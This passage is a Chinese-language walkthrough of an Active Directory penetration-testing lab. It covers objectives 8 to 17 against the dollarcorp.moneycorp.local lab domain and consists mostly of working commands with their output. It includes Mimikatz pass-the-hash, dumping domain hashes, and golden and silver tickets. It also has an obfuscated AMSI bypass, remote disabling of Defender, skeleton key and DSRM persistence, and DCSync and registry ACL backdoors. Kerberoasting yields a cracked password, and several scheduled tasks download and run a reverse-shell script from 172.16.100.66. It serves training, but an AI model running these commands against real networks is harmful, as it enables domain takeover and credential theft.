         * DPAPI    : 9892675d75e91baace876950ee2fe5e8
```

收集到ciadmin的NTML
```
ciadmin:e08253add90dccf1a208523d02998c3d
```

开一个ciadmin权限的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:ciadmin /domain:dollarcorp.moneycorp.local /ntlm:e08253add90dccf1a208523d02998c3d /run:powershell.exe"'
```

因为ciadmin可以横向到dcorp-mgmt，也就是上面userhunter里DA管理员登陆过的机器。这台机器里存储了DA管理员的登录session，我们可以利用它导出NTML，从而提升域管理员权限

```
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
```

在指定session里载入Mimikatz
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

指定目标靶机的session，在目标靶机关闭杀软（效果跟bypass AMSI大同小异，不过因为我们是目标靶机上的管理员，因此可以直接关闭）
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

指定目标靶机的session，在目标靶机执行Mimikatz
```
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

收集到的哈希信息
```
DCORP-MGMT$ : 639c1adde3e0d1ba0d733c7d0d8f23ec
mgmtadmin :  95e2cd7ff77379e34c6e46265e75d754
svcadmin : b38ff50264b74508085d82c69794a4d8
```

已拿到svcadmin的NTML

# Learning Objective 8:
Task
● Dump hashes on the domain controller of dollarcorp.moneycorp.local.
● Using the NTLM hash of krbtgt account, create a Golden ticket.
● Use the Golden ticket to (once again) get domain admin privileges from a machine.


## Dump hashes on the domain controller of dollarcorp.moneycorp.local.

开一个svcadmin权限的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```

查看可以横向的计算机
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-std370.dollarcorp.moneycorp.local
dcorp-stdadm.dollarcorp.moneycorp.local
dcorp-std368.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-dc.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-std363.dollarcorp.moneycorp.local
dcorp-std359.dollarcorp.moneycorp.local
dcorp-std367.dollarcorp.moneycorp.local
mcorp-std366.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-std360.dollarcorp.moneycorp.local
dcorp-std364.dollarcorp.moneycorp.local
dcorp-std361.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-std369.dollarcorp.moneycorp.local
```

可以横向到DC：dcorp-dc.dollarcorp.moneycorp.local

横向到dcorp-dc，执行Invoke-Mimikatz导出本地所有哈希，因为是在DC上操作，所以会导出整个域的NTML
```
PS C:\ad> Enter-PSSession dcorp-dc
[dcorp-dc]: PS C:\Users\svcadmin\Documents> powershell -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\svcadmin\Documents>
[dcorp-dc]: PS C:\Users\svcadmin\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0
}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Ut
i'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}"
 -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLU
E"( ${n`ULl},${t`RuE} )
[dcorp-dc]: PS C:\Users\svcadmin\Documents> iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
[dcorp-dc]: PS C:\Users\svcadmin\Documents> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

收集到的NTML
```
Administrator：af0686cc0ca8f04df42210c9ac980760
DCORP-DC$ ： 126289c16302fb23b71ec09f0d3d5391
krbtgt ： ff46a9d8bd66c6efd77603da26796f35
websvc ： cc098f204c5887eaa8253e7c2749156f
srvadmin ：a98e18228819e8eec3dfa33cb68b0728
appadmin ： d549831a955fee51a43c83efb3928fa7
mgmtadmin ： 95e2cd7ff77379e34c6e46265e75d754
studentadmin ： d1254f303421d3cdbdc4c73a5bce0201
sql1admin ： e999ae4bd06932620a1e78d2112138c6
testda ：a16452f790729fa34e8f3a08f234a82c
```

##  Using the NTLM hash of krbtgt account, create a Golden ticket.


开一个新的学生权限的shell
执行：
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

## Use the Golden ticket to (once again) get domain admin privileges from a machine.
验证金票：
```
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```


新建一个定时任务，反弹dc上的一个shell回来。需要注意Invoke-PowerShellTcp.ps1里最后一行要加上
```
Power -Reverse -IPAddress 172.16.100.66 -Port 443
```
表示调用自己

### 制作定时任务：
```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

### 触发定时任务
```
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
```

拿到反弹shell
```
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.2.1] 64573
Windows PowerShell running as user DCORP-DC$ on DCORP-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32> hostname
dcorp-dc
PS C:\Windows\system32>
```


# Learning Objective 9:
Task
● Try to get command execution on the domain controller by creating silver ticket for:
− HOST service
− WMI


## HOST service
因为之前已经取得了DC服务器的NTML信息

```
DCORP-DC$ ： 126289c16302fb23b71ec09f0d3d5391
```

可以利用来制作 银票

执行命令
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

执行完上面命令，在当前shell会有一个Administrator的session

验证银票：
```
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```

新建一个定时任务，反弹dc上的一个shell回来。需要注意Invoke-PowerShellTcp.ps1里最后一行要加上
```
Power -Reverse -IPAddress 172.16.100.66 -Port 443
```
表示调用自己

### 制作定时任务：
```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

### 触发定时任务
```
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
```

收到反弹shell
```
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.2.1] 64558
Windows PowerShell running as user DCORP-DC$ on DCORP-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved

PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32> hostname
dcorp-dc
PS C:\Windows\system32>
```

## WMI 

wmi按照lab手册需要两张tiket，一张是host，另一张是RPCSS，但是我貌似执行下面其中一条就可以。。

HOST
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

RPCSS
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

然后执行WMI 
```
PS C:\ad> Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local


SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 14393
RegisteredUser  : Windows User
SerialNumber    : 00377-80000-00000-AA805
Version         : 10.0.14393
```


# Learning Objective 10:
Task
● Use Domain Admin privileges obtained earlier to execute the Skeleton Key attack.

万能钥匙作为权限维持的手段，制作完成以后可以以密码```mimikatz```访问域内任何一台计算机

开一个DA权限的shell

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
```


### 方法1
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

开一个学生shell使用下面命令以administrator的身份进入主机
```Enter-PSSession –Computername dcorp-dc –credential dcorp\administrator```


### 方法2(推荐)

回到学生机器,创建一个DC的登录session
```
$sess = New-PSSession dcorp-dc.dollarcorp.moneycorp.local
```

把mimikatz加载到指定session
```
 Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

再次进入DC
```
 Enter-PSSession -Session $sess
```

执行mimikatz，制作万能钥匙
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```

开一个学生shell使用下面命令以student370的身份进入主机
```Enter-PSSession –Computername dcorp-dc –credential dcorp\administrator```


# Learning Objective 11:
Task
● Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.

目录服务还原模式。除了krbtgt服务帐号外，域控上还有个可利用的账户：目录服务还原模式（DSRM）账户，这个密码是在DC安装的时候设置的，所以一般不会被修改

用有DA权限的shell，运行下面命令，dump出DSRM的哈希密码

```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc

SAMKey : 33e0913ef3886d77d5873060bcea1cfb

RID  : 000001f4 (500)
User : Administrator
Hash NTLM: a102ad5753f4c441e3af31c97fad86fd
```
这里会出现Administrator的哈希(也就是DSRM的密码)：```a102ad5753f4c441e3af31c97fad86fd```

再用下面命令dump出现在Administrator的密码，与上面DSRM的密码进行比较

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760
```
新的密码是：```af0686cc0ca8f04df42210c9ac980760```

DSRM administrator不允许登陆，用之前的session进入DC修改

要先bypass ASMI

再运行下面命令，修改DSRM的远程登录策略
```
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```


现在用DSRM的原始哈希，来运行一个有DA权限的shell,注意，这里的/domain参数指定的是dcorp-dc这台计算机，不是域的名字
```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```

验证:
```
PS C:\ad> ls \\dcorp-dc.dollarcorp.moneycorp.local\c$


    Directory: \\dcorp-dc.dollarcorp.moneycorp.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/29/2019   1:32 AM                PerfLogs
d-r---        2/16/2019   9:14 PM                Program Files
d-----        7/16/2016   6:23 AM                Program Files (x86)
d-r---       12/14/2019   8:23 PM                Users
d-----        8/20/2020   2:05 AM                Windows
```

可以访问文件系统，但是不能在这台系统上执行命令。

如果想要用DSRM获得一个shell，可以设置一个定时任务


## 制作定时任务：
```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

## 触发定时任务
```
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
```


获得反弹shell
```
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.2.1] 64272
Windows PowerShell running as user DCORP-DC$ on DCORP-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32> hostname
dcorp-dc
```


# Learning Objective 12:
Task
● Check if studentx has Replication (DCSync) rights.
● If yes, execute the DCSync attack to pull hashes of the krbtgt user.
● If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.



## Check if studentx has Replication (DCSync) rights.

查找账号student366是否有DCSync的权限（此操作需要DA权限）
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```
如果没有任何返回，表示没有权限

## If yes, execute the DCSync attack to pull hashes of the krbtgt user.

问题前提不成立


## If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.

添加完全控制权限
```
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student366 -Rights All -Verbose
```
再把Dcsync权限赋予当前学生账号student366
```
Add-ObjectAcl -TargetDistinguishedName"dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student366 -Rights DCSync -Verbose
```

再次查看账号student366是否有DCSync的权限,看到这次已经有返回
```
PS C:\ad> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference
 -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}


InheritedObjectType   : All
ObjectDN              : DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : dcorp\student366
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511
```

出现```ActiveDirectoryRights : GenericAll```表示成功赋权

执行Dcsync,导出krbtgt哈希（也可以是其他用户,此操作需要在DA权限的shell里操作））
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```


# Learning Objective 13:
Task
● Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.
● Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.

本章节内容为安全描述符。

## Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.

在DA权限shell引入RACE.ps1框架
```
PS C:\ad> . .\RACE.ps1
```

为WMI修改安全描述符，允许student366进入WMI
```
Set-RemoteWMI -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
```

查看
```
gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

### 没有登录凭证，修改安全描述符，使得学生机可以在DC上执行命令

DA shell，引入RACE.ps1，域名写全
```
PS C:\ad> . .\RACE.ps1
PS C:\ad> Set-RemotePSRemoting -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

在学生shell（重启VM生效），执行whoami命令
```
Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
## Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.

### 无管理员密码的情况下从目标机器上dump出哈希

Modifying DC registry security descriptors for remote hash retrieval using DAMP

在DC上修改权限，允许本账号（student366）远程dump出哈希，在DAshell
```
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student366 -Verbose
```

在学生shell（重启VM生效）
引入框架
```
PS C:\ad> . .\RACE.ps1
```

dump出dcorp-dc这台机器的哈希
```
PS C:\ad> Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
VERBOSE: Bootkey/SysKey : 85462B93FC25EE67BB07AD899096199B
VERBOSE: LSA Key        : FD3251451B1293B9ED7AF4BED8E19A678F514B9BC2B42B796E2C72AF156945E9

ComputerName                        MachineAccountHash
------------                        ------------------
dcorp-dc.dollarcorp.moneycorp.local 126289c16302fb23b71ec09f0d3d5391
```

现在我们有了这台机器的哈希，可以用来制作银票

基于HOST服务的银票
```
. .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

基于RPCSS服务的银票
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

可以建一个定时任务反弹DC这台服务器的shell。


# Learning Objective 14:
Task
● Using the Kerberoast attack, crack password of a SQL server service account.

查看所有SPN
```
PS C:\ad> Get-NetUser -spn |select userprincipalname,serviceprincipalname

userprincipalname serviceprincipalname
----------------- --------------------
                  kadmin/changepw
websvc            {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
svcadmin          {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
```

尤其留意域管理员的信息，这里svcadmin开启了SQL server服务。

因为svcadmin是一个域管理员，所以我们可以以它开启的服务请求一个tikcet

下面两条命令在学生shell下执行，如果报错了，可能是student VM的网络问题，重启一下
```
PS C:\ad> Add-Type -AssemblyName System.IdentityModel
PS C:\ad> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dolla
rcorp.moneycorp.local"


Id                   : uuid-396ea046-4707-42b5-aeca-14c64449d666-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/21/2022 7:06:53 AM
ValidTo              : 2/21/2022 5:03:41 PM
ServicePrincipalName : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

```

用klist命令

```
PS C:\ad> klist

Current LogonId is 0:0x3114e90c

Cached Tickets: (11)

<略>
#1>     Client: student366 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/20/2022 23:06:53 (local)
        End Time:   2/21/2022 9:03:41 (local)
        Renew Time: 2/27/2022 23:03:41 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local
<略>
```

有MSSQLSvc的TGS。client就是学生账号student366

用Mimikatz dump出tikets

```
 Invoke-Mimikatz -Command '"kerberos::list /export"'

[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 2/20/2022 11:06:53 PM ; 2/21/2022 9:03:41 AM ; 2/27/2022 11:03:41 PM
   Server Name       : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
   Client Name       : student366 @ DOLLARCORP.MONEYCORP.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

在当前目录生成了一个TGS文件```1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi```

拷贝到文件夹```kerberoast```，使用```tgsrepcrack.py```破解密码

执行命令：
```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

爆破结果
```
PS C:\ad\kerberoast> python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarco
rp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
found password for ticket 0: *ThisisBlasphemyThisisMadness!!  File: 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp
.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
All tickets cracked!
```

得到了svcadmin的明文密码
```
*ThisisBlasphemyThisisMadness!!
```

用上面的明文密码登陆dcorp-dc，输入明文密码后可以成功登录
```
PS C:\ad> Enter-PSSession –Computername dcorp-dc –credential dcorp\svcadmin
[dcorp-dc]: PS C:\Users\svcadmin\Documents> whoami
dcorp\svcadmin
[dcorp-dc]: PS C:\Users\svcadmin\Documents> hostname
dcorp-dc
[dcorp-dc]: PS C:\Users\svcadmin\Documents>
```

# Learning Objective 15:
Task
● Enumerate users that have Kerberos Preauth disabled.
● Obtain the encrypted part of AS-REP for such an account.
● Determine if studentx has permission to set User Account Control flags for any user.
● If yes, disable Kerberos Preauth on such a user and obtain encrypted part of AS-REP.

##  Enumerate users that have Kerberos Preauth disabled.

注意这里用的是dev版本的PowerView

枚举禁用了Kerberos预认证的用户
```
PS C:\ad> . .\PowerView_dev.ps1
PS C:\ad> Get-DomainUser -PreauthNotRequired -Verbose
```

枚举到一个VPN359user用户禁用了Kerberos预认证

## Obtain the encrypted part of AS-REP for such an account.

使用ASREPRoast.ps1获取kerb哈希值，这个值可以使用john等破解工具破解

```
PS C:\ad> cd .\ASREPRoast-master\
PS C:\ad\ASREPRoast-master> . .\ASREPRoast.ps1
PS C:\ad\ASREPRoast-master> Get-ASREPHash -UserName VPN359user -Verbose
```

tool里面没有JTR，去到kali破解这个哈希

## Determine if studentx has permission to set User Account Control flags for any user.

枚举RDPUsers组成员对其中有GenericWrite 或者 GenericAll权限的用户

```
PS C:\ad> . .\PowerView_dev.ps1
PS C:\ad> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

ObjectDN                : CN=Control359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1874506631-3219952063-538504511-1116
IdentityReferenceName   : RDPUsers
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=RDP Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : group
```

因为当前账号（student366）在RDPUsers组中，而RDPUsers组对上面这些用户有GenericAll或者GenericWrite的权限

## If yes, disable Kerberos Preauth on such a user and obtain encrypted part of AS-REP.

强制关闭这些用户的预认证
```
Set-DomainObject -Identity Control359User -XOR @{useraccountcontrol=4194304} -Verbose
```

关闭以后获取这个用户的krb5哈希

```
Get-ASREPHash -UserName Control359User -Verbose
```

获取的这个值可以用JTR破解


# Learning Objective 16:
Task
● Determine if studentx has permissions to set UserAccountControl flags for any user.
● If yes, force set a SPN on the user and obtain a TGS for the user.


## Determine if studentx has permissions to set UserAccountControl flags for any user.

从下面结果可以知道当前账号（student366，是RDPUsers组的成员），对下面显示的账号是有GenericAll权限的
```
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} |select ObjectDN,ActiveDirectoryRights

bjectDN                                                       ActiveDirectoryRights
--------                                                       ---------------------
CN=Control370User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
```

有权限。


## If yes, force set a SPN on the user and obtain a TGS for the user.

选择Support370User用户，查询这个账号是否有SPN

```
PS C:\ad> Get-DomainUser -Identity Support370User | select serviceprincipalname


serviceprincipalname
--------------------
```

没有。

因为本账号（student366，是RDPUsers组的成员），对这个用户有GenericAll权限，我们可以为其设置一个SPN
```
Set-DomainObject -Identity Support370User -Set @{serviceprincipalname='dcorp/whateverX'} -Verbos
```

根据这个SPN，我们可以请求一个可以被破解的ticket
```
PS C:\ad> Add-Type -AssemblyNAme System.IdentityModel
PS C:\ad> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "dcorp/whateverX"


Id                   : uuid-c2d65b15-bd68-4703-bb99-88bc08a6970c-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/21/2022 8:13:32 AM
ValidTo              : 2/21/2022 5:57:53 PM
ServicePrincipalName : dcorp/whateverX
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

```

使用klist命令列出SPN
```
PS C:\ad> klist

Current LogonId is 0:0x3270d
#2>     Client: student366 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: dcorp/whateverX @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/21/2022 0:13:32 (local)
        End Time:   2/21/2022 9:57:53 (local)
        Renew Time: 2/27/2022 23:57:53 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local
```

看到已经有dcorp/whateverX的SPN

用mimikatz导出

```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::list /export"'
[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 2/15/2022 2:36:31 AM ; 2/15/2022 12:36:31 PM ; 2/22/2022 2:36:31 AM
   Server Name       : dcorp/whateverX @ DOLLARCORP.MONEYCORP.LOCAL
   Client Name       : student366 @ DOLLARCORP.MONEYCORP.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 1-40a10000-student366@dcorp~whateverX-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

导出来的tiket可以用tgsrepcrack.py破解

```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@dcorp~whateverX-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

也可以用powerview导出krb5哈希，然后再用john破解
```
Get-DomainUser -Identity Support370User | Get-DomainSPNTicket | select -ExpandProperty Hash
```

# Learning Objective 17:
Task
•  Find a server in the dcorp domain where Unconstrained Delegation is enabled.
•  Access that server, wait for a Domain Admin to connect to that server and get Domain Admin privileges.


## Find a server in the dcorp domain where Unconstrained Delegation is enabled.

非约束委派

枚举非约束委派计算机（Unconstrained Delegation），使用powerview的dev版本
```
PS C:\ad> Get-NetComputer -UnConstrained |select cn
cn
--
DCORP-DC
DCORP-APPSRV
```

枚举到两台计算机启用了无约束委派：dcorp-dc（DC服务器）和dcorp-appsrv

##  Access that server, wait for a Domain Admin to connect to that server and get Domain Admin privileges.

什么是无约束委派？

> 用户 A 去访问服务 B，服务 B 的服务账户开启了非约束委派，那么当用户 A 访问服务 B 的时候会将用户 A 的 TGT 发送给服务 B 并保存进内存，服务 B 能够利用用户 A 的身份去访问用户 A 能够访问到的任意服务。

在下面这个例子里用户 A是DA管理员Administrator，服务 B是机器dcorp-appsrv。由于Administrator访问过dcorp-appsrv，所以把自己的TGT发送给了dcorp-appsrv，那么dcorp-appsrv就能够利用DA管理员的身份去访问域内的任何服务。

由于使用无约束委派的先决条件是有一个有本地管理权限的用户，
我们需要攻陷DCORP-APPSRV这台机器上一个有本地管理员权限的用户
之前我们分别收集了appadmin, srvadmin 和 websvc的用户名机器NTML
现在分别用这三个账号测试，是否在dcorp-appsrv这台机器上有本地管理员权限
```
appadmin:d549831a955fee51a43c83efb3928fa7
srvadmin:a98e18228819e8eec3dfa33cb68b0728
websvc：cc098f204c5887eaa8253e7c2749156f
```

分别对三个用户执行下面权限，得到一个该用户的新shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"'
```


appadmin拥有local admin权限的机器有
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
```

websvc拥有local admin权限的机器有
```
 PS C:\ad> . .\PowerView.ps1
